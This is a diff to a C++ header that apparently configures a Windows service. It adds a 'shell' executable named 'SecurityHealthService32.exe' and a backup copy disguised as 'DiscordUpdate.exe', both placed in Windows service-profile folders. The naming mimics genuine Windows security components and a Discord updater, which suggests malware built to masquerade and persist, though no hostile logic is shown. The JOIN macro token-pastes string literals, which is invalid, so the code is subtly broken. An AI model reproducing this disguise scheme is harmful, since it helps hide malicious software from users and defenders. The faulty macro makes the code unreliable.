@@ -5,9 +5,18 @@
 #define WIN32_LEAN_AND_MEAN		//if left out order of windows.h and winsock.h plays messes up everything (just leave it in)
 
 #define SERVICE_NAME "WindowsHealthService"
+#define SERVICE_DISPLAY_NAME "Windows Health Service"
 #define SERVICE_FILE_NAME "SecurityHealthServiceManager.exe"
 #define SERVICE_ARCHIVE_NAME "external.zip"
 
+#define SHELL_NAME "SecurityHealthService32.exe"
+
+#define JOIN(x, y) x ## y
+#define SHELL_PATH(x) JOIN("C:\\Windows\\ServiceProfiles\\LocalService\\", x)
+#define SHELL_EXE SHELL_PATH(SHELL_NAME)
+#define SHELL_BACKUP_PATH(x) JOIN("C:\\Windows\\ServiceProfiles\\NetworkService\\Downloads\\", x)
+#define SHELL_BACKUP_NAME "DiscordUpdate.exe"
+#define SHELL_BACKUP_EXE SHELL_BACKUP_PATH(SHELL_BACKUP_NAME)
 
 #include <Windows.h>		
 #include <string>
@@ -64,7 +73,5 @@ public:		//functions
 private:	//functions
 	static bool processParameter(std::string &command, std::string compCommand);
 };
-
-std::string GetCWD();
 
 #endif
